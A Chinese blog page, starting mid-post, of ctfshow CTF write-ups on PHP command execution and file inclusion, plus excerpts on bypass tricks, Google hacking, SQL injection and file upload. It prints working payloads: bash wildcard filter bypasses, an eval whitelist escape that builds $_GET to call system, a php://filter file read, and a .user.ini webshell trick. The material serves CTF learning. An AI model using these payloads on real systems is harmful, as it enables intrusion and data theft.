<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RANDOM</span><br><span class="line">此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。</span><br></pre></td></tr></table></figure>

<p>因此光利用RANDOM这个函数理论上就可以得到数字1-5了，不过相对来说4和5的概率会更大。</p>
<p>SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器</p>
<p><code>$&#123;#SHLVL&#125;=&gt;1</code></p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;<span class="comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span></span><br><span class="line">/bin/base6 <span class="number">4</span> flag.php</span><br></pre></td></tr></table></figure>

<p>羽师傅的思路，可以理解，但是很难想到用这种方法绕过</p>
<p>多试几次即可出现base64后的flag</p>
<p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_AIWXSzD9PO-163730173518334.png" alt="chrome_AIWXSzD9PO"></p>
<p>重复的删掉一段并删除+号</p>
<h2 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_CrmaHuAXkI-163730173518335.png" alt="chrome_CrmaHuAXkI"></p>
<p>把源码放出来，但是题还是那个题，多过滤了一个<code>|HOME|</code>，不影响操作</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;<span class="comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span></span><br><span class="line">/bin/base6 <span class="number">4</span> flag.php</span><br></pre></td></tr></table></figure>



<h2 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_SKumDWAvgc-163730173518336.png" alt="chrome_SKumDWAvgc"></p>
<p>过滤掉了SHLVL，放出了PWD和RANDOM</p>
<p>过滤了SHLVL，这时可以考虑用 <code>$?</code>替代</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$?</span><br><span class="line">用途：上一条命令执行结束后的传回值。通常<span class="number">0</span>代表执行成功，非<span class="number">0</span>代表执行有误。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: code=$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br></pre></td></tr></table></figure>

<p>不得不说羽师傅把这个真的研究很透，这些内置变量很多都不知道</p>
<h2 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_To8cEYQ66g-163730173518337.png" alt="chrome_To8cEYQ66g"></p>
<p>增加了<code>#</code>和PWD的过滤，使得我们无法通过获取内置变量的长度获取字符串，PWD可以用HOME代替，其他的没有改变，也就是说我们只要能得到一个数字1就能通过。</p>
<p>上一题不是用了<code>$?</code>，这道继续</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:code=&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br></pre></td></tr></table></figure>



<h2 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="comment">//例子 c=20-1</span></span><br><span class="line">  <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">  <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">  preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>); </span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//帮你算出答案</span></span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目太长了，上源码</p>
<p>代码审计，不是很难理解，get传入的参数c的长度不能超过80，而且不能有那些奇怪的字符，而且还要符合正则表达式</p>
<p>可以进制转换的函数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">base_convert(number,frombase,tobase);</span><br><span class="line">参数	描述</span><br><span class="line">number	    必需。规定要转换的数。</span><br><span class="line">frombase	必需。规定数字原来的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</span><br><span class="line">tobase	    必需。规定要转换的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</span><br><span class="line"></span><br><span class="line">bindec — 二进制转换为十进制</span><br><span class="line">bindec ( string <span class="variable">$binary_string</span> ) : number</span><br><span class="line"></span><br><span class="line">decbin — 十进制转换为二进制</span><br><span class="line">decbin ( int <span class="variable">$number</span> ) : string</span><br><span class="line"></span><br><span class="line">dechex — 十进制转换为十六进制</span><br><span class="line">dechex ( int <span class="variable">$number</span> ) : string</span><br><span class="line"></span><br><span class="line">decoct — 十进制转换为八进制</span><br><span class="line">decoct ( int <span class="variable">$number</span> ) : string</span><br><span class="line"></span><br><span class="line">hexdec — 十六进制转换为十进制</span><br><span class="line">hexdec ( int <span class="variable">$number</span> ) : string</span><br></pre></td></tr></table></figure>

<p>在这个题中，我们不能使用除题目白名单中给出的函数以外的任何字符。那我们的目的就是构造出字母或者构造出函数。<br>假设我们要构造出如下表达式</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$_GET</span>[a](<span class="variable">$_GET</span>[b])&amp;a=system&amp;b=cat flag</span><br></pre></td></tr></table></figure>

<p>我们需要构造的是其实只有 _GET，$我们可以使用，中括号可用花括号代替，小括号也是可以使用的。</p>
<p>这时候我们想到了一个办法，如果可以构造出hex2bin函数就可以将16进制转换成字符串了。</p>
<p>我们又可以用decoct将10进制转换成16进制。也就是可以将10进制转换成字符串。<br>那么问题来了，hex2bin怎么构造呢，这时候就需要用到base_convert了。<br>我们发现36进制中包含了所有的数字和字母，所以只需要将hex2bin按照36进制转换成10进制就可以了。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> base_convert(<span class="string">&#x27;hex2bin&#x27;</span>, 36, 10); 结果  37907361743 </span><br><span class="line"><span class="built_in">echo</span> hexdec(bin2hex(<span class="string">&quot;_GET&quot;</span>)); 结果 1598506324</span><br></pre></td></tr></table></figure>

<p>现在我们要做的就是反过来了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="string">&#x27;37907361743&#x27;</span>,10,36);    hex2bin</span><br><span class="line">base_convert(<span class="string">&#x27;37907361743&#x27;</span>,10,36)(dechex(<span class="string">&#x27;1598506324&#x27;</span>));    _GET</span><br></pre></td></tr></table></figure>

<p>a，b要换成题目白名单里的词，比如我的pi,abs,acos<br><code>[]</code>用<code>()</code>替代</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用到了php特性</span><br><span class="line">$a=&quot;system&quot;;</span><br><span class="line">$a(&quot;ls&quot;);</span><br><span class="line">这样php会执行 system (&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=_GET;$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs=system&amp;acos=tac f*</span><br></pre></td></tr></table></figure>

<p>我们再把_GET进行替换</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$$pi</span>&#123;abs&#125;(<span class="variable">$$pi</span>&#123;acos&#125;)&amp;abs=system&amp;acos=tac f*</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yun421.top/2021/11/19/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yun421">
      <meta itemprop="description" content="短暂的热爱过后剩下的是坚持">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yun421">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/11/19/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">ctfshow.文件包含</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-11-19 11:56:48 / 修改时间：12:12:06" itemprop="dateCreated datePublished" datetime="2021-11-19T11:56:48+08:00">2021-11-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ctfshow-文件包含"><a href="#ctfshow-文件包含" class="headerlink" title="ctfshow.文件包含"></a>ctfshow.文件包含</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p><img src="/2021/11/19/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/chrome_gPlSkedlQV.png" alt="chrome_gPlSkedlQV"></p>
<p><strong>filter伪协议</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2021/11/19/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yun421.top/2021/11/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%B0%8F%E6%8A%80%E5%B7%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yun421">
      <meta itemprop="description" content="短暂的热爱过后剩下的是坚持">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yun421">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/11/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">命令执行绕过小技巧</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-11-19 10:42:42 / 修改时间：12:11:58" itemprop="dateCreated datePublished" datetime="2021-11-19T10:42:42+08:00">2021-11-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="命令执行绕过小技巧"><a href="#命令执行绕过小技巧" class="headerlink" title="命令执行绕过小技巧"></a>命令执行绕过小技巧</h1><h1 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h1><h3 id="windows-下"><a href="#windows-下" class="headerlink" title="windows 下"></a>windows 下</h3><blockquote>
<p><code>|</code>直接执行后面的语句<br><code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br><code>&amp;</code>前面和后面命令都要执行，无论前面真假<br><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
</blockquote>
<h3 id="Linux-下"><a href="#Linux-下" class="headerlink" title="Linux 下"></a>Linux 下</h3><blockquote>
<p><code>;</code>前面和后面命令都要执行，无论前面真假<br><code>|</code>直接执行后面的语句<br><code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br><code>&amp;</code>前面和后面命令都要执行，无论前面真假<br><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
</blockquote>
<hr>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2021/11/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%B0%8F%E6%8A%80%E5%B7%A7/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yun421.top/2021/10/16/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yun421">
      <meta itemprop="description" content="短暂的热爱过后剩下的是坚持">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yun421">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/10/16/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="post-title-link" itemprop="url">信息收集</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-10-16 15:13:08 / 修改时间：15:46:11" itemprop="dateCreated datePublished" datetime="2021-10-16T15:13:08+08:00">2021-10-16</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><h3 id="1-Google-hacking"><a href="#1-Google-hacking" class="headerlink" title="1.Google hacking"></a>1.Google hacking</h3><p><strong>常用搜索语法：</strong><br><strong>intitle:KEYWORD //搜索网页标题中含有关键词的网页</strong><br><strong>intext:KEYWORD //搜索站点正文中含有关键词的网页</strong><br><strong>inurl:KEYWORD //搜索URL中包含有指定字符串的网址</strong><br><strong>inurl:php?id= //搜索PHP网页</strong><br><strong>site:DOMAIN //在指定站点内查找相关的内容</strong><br><strong>filetype:FILE //搜索指定类型的文件</strong></p>
<p><strong>我们可以同时附加多个条件进行筛选，比如 inurl:admin intitle:农具</strong><br><strong>两个筛选条件之间用空格隔开</strong></p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2021/10/16/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yun421.top/2021/04/16/SQL%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yun421">
      <meta itemprop="description" content="短暂的热爱过后剩下的是坚持">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yun421">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/16/SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-16 21:27:08" itemprop="dateCreated datePublished" datetime="2021-04-16T21:27:08+08:00">2021-04-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-11-19 12:36:05" itemprop="dateModified" datetime="2021-11-19T12:36:05+08:00">2021-11-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <meta name="referrer" content="no-referrer">
# SQL注入

<h2 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h2><p>动态交互网站，实现交互利用用户输入<strong>拼接到SQL执行</strong>，输入不同导致返回结果不同。用户输入内容没有经过完美处理，而且构造SQL语句，直接将构造的SQL语句带入SQL语句中执行，导致SQL注入漏洞。</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2021/04/16/SQL%E6%B3%A8%E5%85%A5/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yun421.top/2021/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yun421">
      <meta itemprop="description" content="短暂的热爱过后剩下的是坚持">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yun421">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">文件上传</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-10 21:35:58" itemprop="dateCreated datePublished" datetime="2021-03-10T21:35:58+08:00">2021-03-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-10-15 17:13:34" itemprop="dateModified" datetime="2021-10-15T17:13:34+08:00">2021-10-15</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>1.前台校验，无法上传PHP文件、jpg图片，上传png图片马，抓包改后缀<br>2.我们可以在.user.ini中设置php.ini中PHP_INI_PERDIR和PHP_INI_USER模式的 INI 设置，而且只要是在使用CGI／FastCGI模式的服务器上都可以使用.user.ini<br>auto_prepend_file和auto_append_file设置我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），<br>类似于在index.php中插入一句：require(./a.jpg);</p>
<p>这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）</p>
<p>所以要求当前目录必须要有php文件getflag思路：我们上传一个.user.ini 文件设置一个文件1.jpg然后访问index.php就相当于包含了1.jpg<br>1.我们先上传.user.ini文件（当然文件名抓包之后再修改）</p>
<p>2.然后再上传包含的PHP文件，访问/upload/index.php自动包含</p>
<p>3.使用hackbar或者蚁剑寻找并读取flag</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yun421.top/2021/03/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yun421">
      <meta itemprop="description" content="短暂的热爱过后剩下的是坚持">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yun421">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">文件包含</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-10 21:29:56" itemprop="dateCreated datePublished" datetime="2021-03-10T21:29:56+08:00">2021-03-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-10-15 17:13:28" itemprop="dateModified" datetime="2021-10-15T17:13:28+08:00">2021-10-15</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>普通文件包含</p>
<p>常见的php伪协议大致四种</p>
<p>1.php://filter  主要用于读取源码<br>2.php://input  经常使用file_get_contents获取php://input内容<br>3.data://  执行命令<br>4.file://  访问本地文件系统</p>
<p>不能忘了convert，用于转换编码，缺少会报错</p>
